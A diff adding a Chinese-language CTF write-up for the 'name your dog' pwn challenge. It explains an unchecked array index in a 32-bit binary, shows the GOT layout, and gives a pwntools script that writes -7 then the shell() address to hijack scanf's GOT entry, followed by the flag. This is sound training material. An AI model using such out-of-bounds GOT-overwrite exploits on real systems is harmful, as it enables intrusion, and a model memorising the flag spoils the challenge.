@@ -5774,6 +5774,113 @@ io.interactive()
 
 ------
 
+### [name your dog](https://ce.pwnthebox.com/challenges?id=1777)
+
+先`file ./wustctf2020_name_your_dog`查看文件类型，再`checksec --file=./wustctf2020_name_your_dog `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./wustctf2020_name_your_dog
+./wustctf2020_name_your_dog: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9615fb1408f3d1f6091c2018310bf9170bc6abd0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./wustctf2020_name_your_dog
+[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_name_your_dog'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`wustctf2020_name_your_dog`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+双击`vulnerable()`函数查看详情：
+
+```c
+int vulnerable()
+{
+  int result; // eax
+  int i; // [esp+8h] [ebp-10h]
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  result = puts("I bought you five male dogs.Name for them?");
+  for ( i = 1; i <= 5; ++i )
+  {
+    v2 = NameWhich(&Dogs);
+    printf("You get %d dogs!!!!!!\nWhatever , the author prefers cats ^.^\n", i);
+    result = printf("His name is:%s\n\n", (const char *)(8 * v2 + 134520928));
+  }
+  return result;
+}
+```
+
+双击`NameWhich()`函数查看详情，注意到程序并没有检查数组边界，`v2`可以任意输入，存在数组越界，我们可以通过`v2`的值对程序任意写入。程序调用`NameWhich()`函数时传递的实参为`Dogs`数组，`Dogs`在`.bss`段中存放，数组起始地址为`0x804A060`。
+
+```c
+int __cdecl NameWhich(int a1)
+{
+  int v2[4]; // [esp+18h] [ebp-10h] BYREF
+
+  v2[1] = __readgsdword(0x14u);
+  printf("Name for which?\n>");
+  __isoc99_scanf("%d", v2);
+  printf("Give your name plz: ");
+  __isoc99_scanf("%7s", 8 * v2[0] + a1);
+  return v2[0];
+}
+```
+
+注意到`Functions window`中存在后门函数`shell()`，返回值直接系统调用`/bin/sh`，该函数地址为`0x80485CB`。
+
+```c
+int shell()
+{
+  return system("/bin/sh");
+}
+```
+
+查看程序的`got`表信息，发现`scanf()`函数距离`Dogs`数组的起始地址很近，`(0x804a028 - 0x804A060)/8 = -7`，数组偏移量为`-7`。我们可以通过数组越界来修改`got`表中`scanf()`函数所在地址存放的内容，将内容覆盖为后门函数`shell()`的地址，这样程序在下一次循环访问`scanf`的`got`表中的内容时，就能跳转到后门函数执行。
+
+```bash
+pwndbg> got
+
+GOT protection: Partial RELRO | GOT functions: 8
+ 
+[0x804a00c] printf@GLIBC_2.0 -> 0xf7e07f10 (printf) ◂— call   0xf7ef9189    # printf函数
+[0x804a010] alarm@GLIBC_2.0 -> 0xf7e7dcd0 (alarm) ◂— mov    edx, ebx
+[0x804a014] __stack_chk_fail@GLIBC_2.4 -> 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10
+[0x804a018] puts@GLIBC_2.0 -> 0xf7e234e0 (puts) ◂— push   ebp  # puts函数
+[0x804a01c] system@GLIBC_2.0 -> 0x8048486 (system@plt+6) ◂— push   0x20 /* 'h ' */
+[0x804a020] __libc_start_main@GLIBC_2.0 -> 0xf7dd2820 (__libc_start_main) ◂— call   0xf7ef9189
+[0x804a024] setvbuf@GLIBC_2.0 -> 0xf7e23c90 (setvbuf) ◂— call   0xf7ef9189
+[0x804a028] __isoc99_scanf@GLIBC_2.7 -> 0xf7e08ff0 (__isoc99_scanf) ◂— call   0xf7ef9189  # scanf函数
+```
+
+编写`Python`代码求解得到`PTB{7a2adc41-67c7-45d2-bb5f-a547fb78b67b}`。
+
+```python
+from pwn import *
+
+io = remote('redirect.do-not-trust.hacking.run', 10250)
+elf = ELF('./wustctf2020_name_your_dog')
+shell = elf.symbols['shell']
+io.sendlineafter(b'Name for which?\n>', b'-7')
+io.sendlineafter(b'Give your name plz:', p32(shell))
+io.interactive()
+```
+
+------
+
 ## Pwnable.kr
 
 ### fd
